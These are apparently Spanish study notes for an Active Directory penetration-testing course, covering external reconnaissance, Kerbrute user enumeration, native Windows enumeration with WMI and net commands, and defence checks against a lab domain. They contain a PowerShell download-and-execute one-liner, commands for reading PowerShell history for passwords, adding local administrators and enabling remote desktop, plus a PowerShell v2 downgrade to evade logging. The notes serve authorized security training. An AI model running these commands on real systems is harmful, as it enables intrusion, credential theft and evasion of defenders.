## índice

- [[#Enumeración interna]]
- [[#LLMNR-NBT-NS Poisoning]]
	- [[#Desde Linux]]
	- [[#Desde Windows]]
- [[#Password Spraying]]
	- [[#Enumerando política de contraseñas]]
		- [[#Usando PowerView]]
	- [[#Password Spraying interno]]
- [[#Enumeración con credenciales - Linux]]
- [[#Enumeración con credenciales - Windows]]
- [[#Kerberoasting]]
	- [[#Kerberoasting - Desde Linux]]
	- [[#Kerberoasting - Desde Windows]]
- [[#ACL (Access Control List)]]
	- [[#Enumerando ACLs con PowerView]]
	- [[#Enumerando ACLs con BloodHound]]
	- [[#Tácticas de abuso en ACL]]
- [[#DCSync]]
- [[#Acceso privilegiado]]
- [[#Kerberos Double Hop]]
- [[#Vulnerabilidades críticas]]
	- [[#NoPac (SamAccountName Spoofing)]]
	- [[#PrintNightmare]]
	- [[#PetitPotam (MS-EFSRPC)]]
- [[#Misconfiguraciones variadas]]
	- [[#Credenciales en SMB Shares y scripts SYSVOL]]
	- [[#GPO Abuse]]
- [[# Fundamentos de las confianzas de dominio]]
	- [[#Visión general de las confianzas de dominio]]
	- [[#Enumerando relaciones de confianza]]
- [[#Atacando confianzas de dominio - Confianzas hijo → padre (Windows)]]
	- [[#Obteniendo el hash NT de la cuenta KRBTGT usando Mimikatz]]
	- [[#Creando un Golden Ticket con Mimikatz]]
	- [[#ExtraSids Attack - Rubeus]]
		- [[#Creando un Golden Ticket usando Rubeus]]
- [[#Atacando confianzas de dominio - Confianzas hijo → padre (Linux)]]
	- [[#Realizando un DCSync con `secretsdump.py`]]
	- [[#Realizando fuerza bruta de SIDs usando `lookupsid.py`]]
	- [[#Obteniendo el SID del dominio y adjuntando el RID del grupo Enterprise Admins]]
	- [[#Construyendo un Golden Ticket usando `ticketer.py`]]
	- [[#Lanzando el ataque con `raiseChild.py`]]
- [[#Atacando confianzas de dominio – Abuso de confianzas entre bosques (_Cross-Forest_) – desde Windows]]
	- [[#Kerberoasting entre bosques]]
	- [[#Reutilización de la contraseña de admin y membresía de grupo]]
	- [[#Abuso de SID History entre bosques (Cross-Forest)]]

Antes de comenzar cualquier prueba de penetración, **realizar una fase de reconocimiento externo** puede ser muy beneficioso. Esta fase cumple varias funciones clave:

- **Validar la información** proporcionada por el cliente en el documento de alcance.    
- **Asegurarse de actuar dentro del alcance correcto**, especialmente si se trabaja de forma remota.    
- **Detectar información pública que pueda impactar** en la auditoría, como credenciales filtradas.    

La idea es clara: entender bien el terreno antes de actuar, para garantizar una prueba lo más completa y precisa posible. Esto incluye **identificar filtraciones de información** o datos comprometidos ya disponibles públicamente. Algunos ejemplos concretos:

- Obtener el **formato de los nombres de usuario** a través de la web corporativa o redes sociales.    
- Buscar **repositorios de GitHub** del cliente en busca de credenciales o configuraciones sensibles subidas por error.    
- Analizar **documentos públicos** que puedan contener referencias a portales internos o servicios accesibles desde fuera.    

Este reconocimiento inicial puede parecer trivial, pero muchas veces es la **puerta de entrada real** al entorno interno.

### ¿Qué estamos buscando?

Cuando efectuamos un reconocimiento externo, hay varios items clave que deberíamos buscar. Esta información puede no estar siempre accesible de forma pública, pero sería prudente comprobar qué hay ahí fuera. Si nos atascamos durante un pentest, mirar atrás a lo que podría ser obtenido a través de reconocimiento pasivo puede darnos esa información para continuar, como filtraciones de contraseñas que podrían ser utilizadas para accededer a un VPN o algún otro servicio expuesto. 

##### 📡 Puntos clave de reconocimiento externo

| Punto de datos             | Descripción                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Espacio IP**             | ASN válidos asociados al objetivo, rangos de IP utilizados por la infraestructura pública, presencia en la nube y proveedores de hosting, registros DNS, etc.                                                                                                                                                      |
| **Información de dominio** | Basada en datos IP, DNS y registros del sitio. ¿Quién administra el dominio? ¿Existen subdominios vinculados al objetivo? ¿Hay servicios accesibles públicamente (servidores de correo, DNS, portales web, VPN, etc.)? ¿Podemos identificar medidas defensivas como SIEM, antivirus, IPS/IDS, etc.?                |
| **Formato de esquemas**    | ¿Podemos descubrir cuentas de correo electrónico, nombres de usuario de AD o políticas de contraseñas? Cualquier dato que nos permita generar una lista válida de usuarios para realizar ataques como password spraying, credential stuffing o fuerza bruta.                                                       |
| **Divulgaciones de datos** | Archivos públicos accesibles (.pdf, .ppt, .docx, .xlsx, etc.) que contengan información relevante: listados de intranet, metadatos de usuarios, shares, software o hardware crítico (ejemplo: credenciales subidas a un GitHub público, formato de nombre de usuario encontrado en los metadatos de un PDF, etc.). |
| **Datos de brechas**       | Cualquier usuario, contraseña u otra información crítica filtrada públicamente que pueda ser usada por un atacante para obtener acceso inicial.                                                                                                                                                                    |

### ¿Dónde lo estamos buscando?

Nuestra lista de información puede ser construida de muchas formas distintas. Hay muchas webs y herramientas que pueden darnos un poco o toda la información de la tabla superior que podríamos usar para obtener información vital en nuestra auditoría. La siguiente tabla lista recursos potenciales y ejemplos que pueden ser utilizados:
##### 🔍 Fuentes de información para reconocimiento externo

| Recurso                         | Ejemplos |
|----------------------------------|----------|
| **Registros ASN / IP**          | IANA, ARIN (para búsquedas en América), RIPE (para Europa), BGP Toolkit |
| **Registradores de dominio y DNS** | Domaintools, PTRArchive, ICANN, peticiones manuales de registros DNS al dominio o a servidores conocidos como 8.8.8.8 |
| **Redes sociales**              | Búsquedas en LinkedIn, Twitter, Facebook, redes sociales relevantes de la región, artículos de prensa, y cualquier información útil sobre la organización |
| **Webs corporativas públicas**  | Las webs corporativas suelen incluir información valiosa. Secciones como “Quiénes somos” o “Contacto”, documentos incrustados o noticias pueden contener datos útiles |
| **Repositorios y almacenamiento en la nube / desarrollo** | GitHub, buckets S3 de AWS, contenedores Azure Blob, Google Dorks para buscar archivos expuestos públicamente |
| **Fuentes de datos comprometidos (brechas)** | HaveIBeenPwned para ver si hay correos corporativos en brechas públicas, Dehashed para buscar correos con contraseñas en texto claro o hashes que puedan crackearse offline. Estas credenciales pueden probarse en portales expuestos (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, aplicaciones personalizadas, etc.) que usen autenticación AD |
El **BGP Toolkit de Hurricane Electric** es muy útil para identificar los **bloques de direcciones IP** asignados a una organización y su **ASN** (Sistema Autónomo). Basta con introducir un dominio o IP para obtener datos relevantes.

- **Grandes empresas** suelen tener su **propio ASN**, ya que alojan su infraestructura.    
- **Empresas pequeñas o nuevas** suelen alojar sus servicios en proveedores como **Cloudflare, AWS, Azure o Google Cloud**.    

Esto es crítico porque si la infraestructura **no es propia**, puede estar **fuera del alcance autorizado**. Atacar sin querer a un tercero por compartir infraestructura (por ejemplo, un servidor en la nube) **viola el acuerdo con el cliente**.

> **Siempre hay que validar si los sistemas están autogestionados o son de terceros**, y esto debe quedar **claramente definido en el documento de alcance**.

En algunos casos, se necesita **permiso escrito del proveedor**, como:
- **AWS**: permite pentesting sobre ciertos servicios sin aprobación previa.    
- **Oracle**: exige notificación previa mediante su formulario específico.    

Este tipo de gestiones debe tramitarlas tu empresa (equipo legal, contratos, etc.). Si hay duda, **escala el asunto antes de lanzar cualquier ataque externo**. Es tu responsabilidad tener **permiso explícito** sobre cada host a auditar. Detenerse a confirmar el alcance **siempre es mejor que excederse**.

### 🧍‍♂️ Recolección de usuarios (Username Harvesting)

Se puede utilizar una herramienta como **linkedin2username** para extraer nombres desde la página de LinkedIn de la empresa y generar distintos formatos de nombre de usuario (ej: `flast`, `first.last`, `f.last`, etc.).  
Esto permite construir una lista de posibles cuentas a usar en ataques de **password spraying**.

### 🔐 Búsqueda de credenciales (Credential Hunting)

**Dehashed** es una herramienta muy útil para buscar **credenciales en texto claro** o **hashes de contraseñas** en bases de datos filtradas.  
Se puede consultar directamente desde su web o mediante scripts que acceden a su **API**.

Aunque muchas veces se encuentran contraseñas antiguas o cuentas ya inactivas, también pueden aparecer credenciales **válidas para portales externos que usen autenticación AD**, o incluso acceso interno.

Además, sirve para **reforzar o enriquecer** las listas de usuarios para ataques posteriores de spraying o fuerza bruta.

```shell-session
sudo python3 dehashed.py -q inlanefreight.local -p
```

> *El script de Dehashed puede encontrarse [aquí](https://github.com/mrb3n813/Pentest-stuff/blob/master/dehashed.py)*

# Enumeración interna 

Es habitual comenzar una auditoría **desde un host Linux sin credenciales de dominio**. Muchas organizaciones prefieren ver qué se puede lograr desde una posición ciega, lo que simula escenarios reales como:

- Un atacante que compromete la red desde Internet (phishing, RCE, VPN expuesta...).    
- Acceso físico (invitado malicioso, acceso a un puerto LAN).    
- Acceso Wi-Fi desde fuera del edificio.    
- Un empleado desleal o comprometido.    

🟡 **Según el resultado**, el cliente puede decidir facilitarte:
- Un **host unido al dominio**, o    
- Unas **credenciales limitadas** para acelerar y ampliar la auditoría.

| Punto clave                      | Descripción |
|----------------------------------|-------------|
| **Usuarios de AD (AD Users)**    | Enumerar cuentas válidas que puedan ser objetivo de ataques como password spraying o ASREPRoasting. |
| **Equipos unidos al dominio**    | Especialmente los críticos: Controladores de Dominio, servidores de ficheros, SQL, web, correo (Exchange), etc. |
| **Servicios clave**              | Detectar servicios como Kerberos (88/TCP), LDAP (389/TCP), NetBIOS (137/139), DNS (53), SMB (445), que indiquen entorno Windows-AD. |
| **Equipos y servicios vulnerables** | Buscar “quick wins” — hosts con vulnerabilidades explotables que te permitan obtener acceso inicial (SMB abierto, RCE conocida, credenciales por defecto, etc.). |

🛠️ **Importante**: guarda los resultados de las herramientas (`nmap`, `smbclient`, `crackmapexec`, etc.) y capturas clave. Todo lo que documentes aquí puede justificar el acceso posterior o elevar la criticidad del informe.

### 🎯 TTPs (Tácticas, Técnicas y Procedimientos) para enumerar Active Directory

Enumerar un entorno de Active Directory **sin un plan claro puede ser abrumador**. Hay **una enorme cantidad de datos** en AD y si lo haces todo de golpe, puedes perder información relevante o duplicar trabajo inútil.

🔸 Lo recomendable es **trabajar por etapas**, desarrollando tu propia **metodología repetible** a medida que ganes experiencia. Aunque cada pentester tiene su estilo, el flujo inicial suele seguir una misma lógica.

##### 🧭 Metodología general propuesta

1. **🎯 Establece un plan**    
    - Define claramente qué vas a buscar en cada fase.        
    - No te limites a una sola herramienta, prueba varias para ver diferencias, sintaxis y resultados.
        
2. **🔎 Detección pasiva de hosts**    
    - Escucha el entorno sin generar tráfico activo (por ejemplo: ARP, mDNS, LLMNR).        
    - Ideal en escenarios stealth o con restricciones.
        
3. **📡 Validación activa de hosts detectados**    
    - Escaneos activos (`nmap`, `smbclient`, `ldapsearch`, etc.).        
    - Identificar servicios, nombres de máquina, posibles vulnerabilidades.
        
4. **🔍 Recolección de información interesante**    
    - Consultas LDAP, detección de sesiones activas, shares abiertos, SPNs, GPOs, etc.        
    - Guardar todo lo que tenga potencial de explotación o acceso a datos internos.
        
5. **🧠 Revisión y planificación**    
    - Evalúa lo obtenido: ¿tenemos ya una cuenta de usuario o credenciales válidas?        
    - Si es así, comenzar con **enumeración autenticada** desde tu host atacante (Linux) o pivotar a una máquina unida al dominio.

En auditorías black-box, conviene **escuchar primero la red** con herramientas como **Wireshark** o **tcpdump**, antes de lanzar escaneos.
Aunque en redes conmutadas solo vemos el tráfico del dominio de broadcast, podemos identificar:
- IPs activas vía **ARP**    
- Nombres de host mediante **mDNS/LLMNR**    
- Tráfico que indica presencia de **Active Directory** (LDAP, Kerberos)   

Esto ayuda a entender la red sin generar ruido y planificar los siguientes pasos.

### Usando fping

`fping` es similar a `ping`, pero más eficiente para escaneos en red. Permite enviar peticiones ICMP a múltiples direcciones a la vez, lo que lo hace útil en auditorías internas.

```shell-session
amr251@htb[/htb]$ fping -asgq 172.16.5.0/23

172.16.5.5
172.16.5.25
172.16.5.50
172.16.5.100
172.16.5.125
172.16.5.200
172.16.5.225
172.16.5.238
172.16.5.240
...SNIP...
```

El comando anterior valida qué hosts están activos en la red `/23` y lo hace de forma silenciosa, en lugar de saturar la terminal con resultados para cada IP de la lista objetivo. Podemos combinar los resultados exitosos con la información obtenida en las comprobaciones pasivas para crear una lista y realizar un escaneo más detallado con Nmap. A partir del comando `fping`, podemos ver 9 "hosts vivos", incluyendo nuestro host de ataque.

### Identificando usuarios

Si el cliente no nos proporciona una cuenta de usuario para comenzar las pruebas (lo cual es habitual), necesitaremos encontrar una forma de **obtener acceso al dominio** mediante alguno de estos métodos:

- Credenciales en texto claro    
- Un **hash NTLM** de un usuario    
- Una **shell SYSTEM** en un host unido al dominio    
- Una shell en el **contexto de un usuario de dominio**    

Conseguir un usuario válido con sus credenciales es un paso **crítico** en las fases iniciales de una auditoría interna. Incluso con acceso de bajo nivel, se abren muchas posibilidades para realizar **enumeración más avanzada** e incluso lanzar ataques posteriores.

Veamos una forma de empezar a construir una lista de usuarios válidos en un dominio, que podremos usar más adelante en la evaluación.

### Kerbrute - Enumeración de usuarios desde dentro en AD

Kerbrute es una opción más discreta para **enumerar cuentas de dominio**, ya que se basa en errores de preautenticación de Kerberos, los cuales **normalmente no generan logs ni alertas**.

Se utiliza junto a diccionarios como `jsmith.txt` o `jsmith2.txt` del repositorio de **Insidetrust**, que incluye múltiples listas de usuarios muy útiles para esta fase cuando partimos sin autenticación.

Apuntamos Kerbrute contra el **controlador de dominio (DC)** identificado previamente y le pasamos una wordlist. Es rápido y nos indica si los usuarios existen o no, lo cual sirve como punto de partida para ataques como **password spraying** (que veremos más adelante).

```shell-session
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

2021/11/17 23:01:46 >  Using KDC(s):
2021/11/17 23:01:46 >   172.16.5.5:88
2021/11/17 23:01:46 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2021/11/17 23:01:50 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL

 <SNIP>
 
2021/11/17 23:01:51 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
2021/11/17 23:01:52 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds
```

---
### Qué puedes hacer con acceso SYSTEM en un host unido al dominio:

- Enumerar el dominio con herramientas como **BloodHound** o **PowerView**    
- Lanzar ataques de **Kerberoasting** o **ASREPRoasting**    
- Ejecutar **Inveigh** para capturar hashes Net-NTLMv2 o hacer SMB relay    
- Realizar **impersonación de tokens** para secuestrar sesiones de usuarios privilegiados    
- Ejecutar ataques sobre **permisos ACL** en objetos de AD

Ten en cuenta el **alcance y estilo de la auditoría** al elegir las herramientas a utilizar.
Si estás realizando una **auditoría no evasiva** (todo comunicado y visible, con el personal del cliente al tanto), no importa demasiado el nivel de ruido que generes en la red.
Sin embargo, en una **auditoría evasiva**, una **evaluación adversarial** o un **ejercicio Red Team**, el objetivo es simular los TTPs de un atacante real, y en ese contexto la **discreción es fundamental**.
Lanzar Nmap contra toda la red no es precisamente sigiloso, y muchas de las herramientas habituales de pentesting pueden generar alertas si el cliente tiene un SOC preparado o un equipo Blue con experiencia.
Por eso, **asegúrate siempre de aclarar los objetivos y el estilo de la prueba con el cliente por escrito antes de comenzar**.

## Escenario

A continuación vamos a ver un escenario para AD y como enumerar todo tipo de información desde un host Windows. Supongamos que nuestro cliente nos ha pedido que probemos su entorno AD desde un equipo gestionado sin acceso a Internet, y todos los intentos de cargar herramientas en él han fracasado. El cliente quiere ver qué tipos de enumeración son posibles, así que tendremos que recurrir a “vivir del terreno” usando solo herramientas y comandos nativos de Windows/Active Directory. Esto también puede ser un enfoque más sigiloso y puede no generar tantos registros ni alertas como cuando incorporamos herramientas externas en secciones anteriores. La mayoría de los entornos empresariales actuales cuentan con algún tipo de monitorización y registro de red, incluidos IDS/IPS, cortafuegos y sensores pasivos, además de defensas en los propios hosts como Windows Defender o EDR corporativo. Dependiendo del entorno, también pueden tener sistemas que establecen una línea base de tráfico “normal” y buscan anomalías. Por ello, nuestras posibilidades de ser detectados aumentan exponencialmente cuando empezamos a introducir herramientas en el entorno desde el exterior.

##### Comandos de entorno para el host y reconocimiento de red

| Comando                                           | Resultado                                                                                       |
|---------------------------------------------------|-------------------------------------------------------------------------------------------------|
| `hostname`                                        | Imprime el nombre del equipo                                                                    |
| `[System.Environment]::OSVersion.Version`         | Muestra la versión y nivel de revisión del sistema operativo                                    |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Lista los parches y hotfixes instalados en el equipo                                             |
| `ipconfig /all`                                   | Muestra el estado y la configuración de los adaptadores de red                                   |
| `set`                                             | Muestra las variables de entorno de la sesión actual (ejecutado desde CMD)                      |
| `echo %USERDOMAIN%`                               | Muestra el nombre del dominio al que pertenece el equipo (ejecutado desde CMD)                  |
| `echo %logonserver%`                              | Imprime el nombre del controlador de dominio con el que el equipo inicia sesión (desde CMD)     |

El comando `systeminfo` imprime un resumen de la información del equipo en una sola salida concisa. Ejecutar un único comando genera menos registros, reduciendo así la probabilidad de ser detectados por un defensor.

##### Aprovechando PowerShell

| Cmdlet                                                                                     | Descripción                                                                                                                                                                |
| ------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                               | Lista los módulos disponibles que están cargados para su uso.                                                                                                              |
| `Get-ExecutionPolicy -List`                                                                | Muestra las políticas de ejecución configuradas para cada ámbito (scope) en el equipo.                                                                                     |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                | Cambia la política de ejecución solo para el proceso actual, revirtiéndose al cerrar o terminar el proceso. Ideal para no dejar cambios permanentes en el equipo víctima.  |
| `Get-ChildItem Env: \| ft Key,Value`                                                       | Muestra variables de entorno, como rutas, usuarios, información del equipo, etc.                                                                                           |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Obtiene el historial de comandos de PowerShell del usuario especificado, lo cual puede revelar contraseñas o indicar archivos de configuración o scripts con credenciales. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <comandos>"`     | Descarga y ejecuta rápidamente un script desde una URL en memoria usando PowerShell, sin guardar el archivo en disco (`-nop` = NoProfile).                                 |

##### Checkeos rápidos usando PowerShell

Hemos realizado una enumeración básica del equipo. Ahora, hablemos de algunas tácticas de seguridad operacional.

Muchos defensores desconocen que suelen existir varias versiones de PowerShell en un sistema. Si no se han desinstalado, todavía pueden utilizarse. El registro de eventos de PowerShell se introdujo a partir de la versión 3.0. Con esto en mente, podemos intentar invocar PowerShell 2.0 o anterior; si tiene éxito, nuestras acciones desde esa consola no quedarán registradas en el Visor de Eventos. Es una excelente forma de pasar desapercibidos mientras aprovechamos recursos nativos del sistema. A continuación, un ejemplo de cómo degradar la versión de PowerShell

##### Bajar la versión de PowerShell

```powershell-session
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
...SNIP...

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.
```

Hemos comprobado que la versión de PowerShell se ha degradado con éxito y, a partir de ese momento, ya no se registran comandos en el registro operativo de PowerShell ni en el registro de Windows PowerShell. La última entrada en los logs coincide con el momento del downgrade, confirmando que la shell antigua no genera más eventos.

##### Examinando el log de eventos de PowerShell

![[PowershellLogs.png | 800]]

Con el registro de bloques de script activado ([Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2)), todo lo que escribimos en PowerShell v3+ queda grabado. Al degradar a PowerShell v2, el Script Block Logging deja de funcionar, y nuestras acciones posteriores ya no se registran. Hay que tener en cuenta que el propio comando de downgrade (`powershell.exe -version 2`) sí queda grabado, lo que deja evidencia del cambio y puede alertar a un defensor atento cuando vean que el log cesa tras esa entrada.

##### Starting V2 Logs

![[Powershell_Logs2.png | 1000]]

### Comprobando defensas

Los siguientes comandos usan las utilidades `netsh` y `sc` para ayudarnos a tener un estado del host en lo que se refiere a la configuración del Firewall y para comprobar el estado de Windows Defender.

##### Comprobando el FireWall

```powershell-session
PS C:\htb> netsh advfirewall show allprofiles
```

Para hacerlo desde cmd:

```cmd-session
C:\htb> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Arriba, comprobamos si Defender está en ejecución. Abajo comprobaremos el estado y configuración con el cmdlet `Get-MpComputerStatus`

```powershell-session
PS C:\htb> Get-MpComputerStatus
```

Conocer la versión y configuración del antivirus nos indica la frecuencia de los escaneos, si la detección bajo demanda está activa y más. Además, es información clave para el informe, ya que puede revelar a los defensores ajustes deshabilitados o escaneos mal programados y ayudarles a corregirlo.

##### ¿Me encuentro solo?

Al acceder por primera vez a un equipo, verifica que no haya otros usuarios conectados; si interrumpes su sesión o provocas avisos, podrían descubrir tu presencia, cambiar credenciales y hacerte perder el acceso.

##### Usando `qwinsta`

```powershell-session
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen
```

Ahora que tenemos una idea clara del estado de nuestro host, podemos enumerar la configuración de red del equipo e identificar posibles máquinas o servicios del dominio a los que queramos atacar a continuación.

### Información de red

| Comando de Red                          | Descripción                                                                                          |
|-----------------------------------------|------------------------------------------------------------------------------------------------------|
| `arp -a`                                | Lista todos los hosts conocidos almacenados en la tabla ARP.                                         |
| `ipconfig /all`                         | Muestra la configuración de los adaptadores del equipo y permite identificar el segmento de red.     |
| `route print`                           | Muestra la tabla de enrutamiento (IPv4 e IPv6), identificando redes conocidas y rutas de capa 3.    |
| `netsh advfirewall show allprofiles`    | Muestra el estado del firewall del equipo, indicando si está activo y si filtra tráfico.            |
### Windows Management Instrumentation (WMI)

Windows Management Instrumentation (WMI) es un motor de scripting ampliamente utilizado en entornos empresariales Windows para obtener información y ejecutar tareas administrativas tanto en equipos locales como remotos. Para nuestro caso, generaremos un informe WMI sobre usuarios de dominio, grupos, procesos y otra información de nuestro equipo y de otros hosts del dominio.

##### Comprobaciones rápidas con WMI

| Comando                                                             | Descripción                                                                                              |
|---------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`             | Muestra el nivel de parche y la descripción de los hotfixes aplicados                                    |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Muestra información básica del equipo, incluidos los atributos listados                                  |
| `wmic process list /format:list`                                    | Lista todos los procesos en el equipo                                                                    |
| `wmic ntdomain list /format:list`                                   | Muestra información sobre el dominio y los controladores de dominio                                      |
| `wmic useraccount list /format:list`                                | Muestra información de todas las cuentas locales y de dominio que hayan iniciado sesión en el equipo     |
| `wmic group list /format:list`                                      | Muestra información de todos los grupos locales                                                          |
| `wmic sysaccount list /format:list`                                 | Muestra información de las cuentas del sistema usadas como cuentas de servicio                            |
Abajo podemos ver información sobre el dominio y el dominio hijo, y el bosque externo con el que nuestro dominio actual tiene una relación de confianza. Veamos un cheatsheet de comandos con wmi:

##### Enumeración del Host

| Comando                                                                                                          | Descripción                                                                                                     |
|------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------|
| `wmic os LIST Full`                                                                                              | Muestra todos los detalles del sistema operativo (usar la propiedad `Caption` para obtener el nombre del SO).   |
| `wmic computersystem LIST full`                                                                                  | Muestra información completa del sistema (fabricante, modelo, usuario, roles, etc.).                            |
| `wmic /namespace:\\root\securitycenter2 path antivirusproduct`                                                    | Lista el producto antivirus instalado y su estado.                                                              |
| `wmic path Win32_PnPdevice`                                                                                      | Enumera los dispositivos Plug & Play conectados.                                                                |
| `wmic qfe list brief`                                                                                            | Lista los hotfixes y actualizaciones instalados de forma resumida.                                              |
| `wmic DATAFILE where "path='\\Users\\test\\Documents\\'" GET Name,readable,size`                                  | Lista archivos en la ruta indicada con nombre, permiso de lectura y tamaño.                                     |
| `wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name,readable,size /VALUE`                      | Busca archivos cuyo nombre contenga “password” en C: y muestra nombre, permiso de lectura y tamaño.             |
| `wmic USERACCOUNT Get Domain,Name,Sid`                                                                           | Muestra todas las cuentas locales y de dominio que han iniciado sesión con su dominio, nombre y SID.            |
##### Enumeración del Dominio

| Comando                                                                                                          | Descripción                                                                                                     |
|------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------|
| `wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE`                                               | Muestra la(s) dirección(es) del controlador de dominio, nombre del dominio y roles.                             |
| `wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='testAccount'" GET`                | Obtiene atributos detallados del usuario `testAccount`.                                                         |
| `wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname`                                        | Lista el nombre SAM de todos los usuarios del dominio.                                                          |
| `wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname`                                       | Lista el nombre SAM de todos los grupos del dominio.                                                            |
| `wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" GET ds_member /Value` | Muestra los miembros (DN) del grupo “Domain Admins”.                                                            |
| `wmic path win32_groupuser where (groupcomponent="win32_group.name='domain admins',domain='YOURDOMAINHERE'")`    | Enumera usuarios y grupos anidados dentro de “Domain Admins”.                                                    |
| `wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname`                                    | Lista el nombre SAM de todos los equipos del dominio.                                                           |
| `wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname`                                       | Lista el nombre DNS de todos los equipos del dominio.                                                           |
#### Miscelánea

| Comando                                                                                                               | Descripción                                                         |
| --------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| `wmic process call create "cmd.exe /c calc.exe"`                                                                      | Ejecuta remotamente el comando indicado (aquí abre la calculadora). |
| `wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"`                                           | Habilita Escritorio Remoto en el host local.                        |
| `wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"` | Habilita Escritorio Remoto en el host remoto especificado.          |

```powershell-session
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

Caption          Description      DnsForestName           DomainControllerAddress  DomainName
ACADEMY-EA-MS01  ACADEMY-EA-MS01
INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
```

### Comandos `net`

Los comandos `net` pueden resultar muy útiles para enumerar información del dominio. Con ellos se puede consultar tanto el equipo local como equipos remotos, de forma similar a lo que ofrece WMI. Podemos listar datos como:

- Usuarios locales y de dominio    
- Grupos    
- Hosts    
- Usuarios concretos en grupos    
- Controladores de dominio    
- Requisitos de contraseñas    

A continuación veremos algunos ejemplos. Ten en cuenta que los comandos de `net.exe` suelen estar monitorizados por soluciones EDR y pueden delatar rápidamente nuestra ubicación si la evaluación requiere sigilo. Algunas organizaciones configuran sus herramientas de monitorización para generar alertas cuando ciertos comandos se ejecutan desde usuarios pertenecientes a OU específicas, por ejemplo, si la cuenta de un Marketing Associate corre `whoami` o `net localgroup administrators`, lo que sería una señal de alerta inmediata para quien supervise la red.

| Comando                                        | Descripción                                                                          |
| ---------------------------------------------- | ------------------------------------------------------------------------------------ |
| `net accounts`                                 | Información sobre requisitos de contraseña                                           |
| `net accounts /domain`                         | Políticas de contraseña y bloqueo                                                    |
| `net group /domain`                            | Información sobre grupos de dominio                                                  |
| `net group "Domain Admins" /domain`            | Lista de usuarios con privilegios de administrador de dominio                        |
| `net group "domain computers" /domain`         | Lista de equipos unidos al dominio                                                   |
| `net group "Domain Controllers" /domain`       | Lista de cuentas de equipo de los controladores de dominio                           |
| `net group <nombre_del_grupo> /domain`         | Usuarios que pertenecen al grupo especificado                                        |
| `net groups /domain`                           | Lista de todos los grupos de dominio                                                 |
| `net localgroup`                               | Lista de todos los grupos locales                                                    |
| `net localgroup administrators /domain`        | Usuarios del grupo Administradores en el dominio (incluye Domain Admins por defecto) |
| `net localgroup Administrators`                | Información sobre el grupo Administrators                                            |
| `net localgroup administrators [usuario] /add` | Añade un usuario al grupo Administrators                                             |
| `net share`                                    | Consulta los recursos compartidos actuales                                           |
| `net user <NOMBRE_CUENTA> /domain`             | Información sobre un usuario en el dominio                                           |
| `net user /domain`                             | Lista de todos los usuarios del dominio                                              |
| `net user %username%`                          | Información sobre el usuario actual                                                  |
| `net use x: \\equipo\recurso`                  | Monta el recurso compartido localmente                                               |
| `net view`                                     | Obtiene una lista de equipos                                                         |
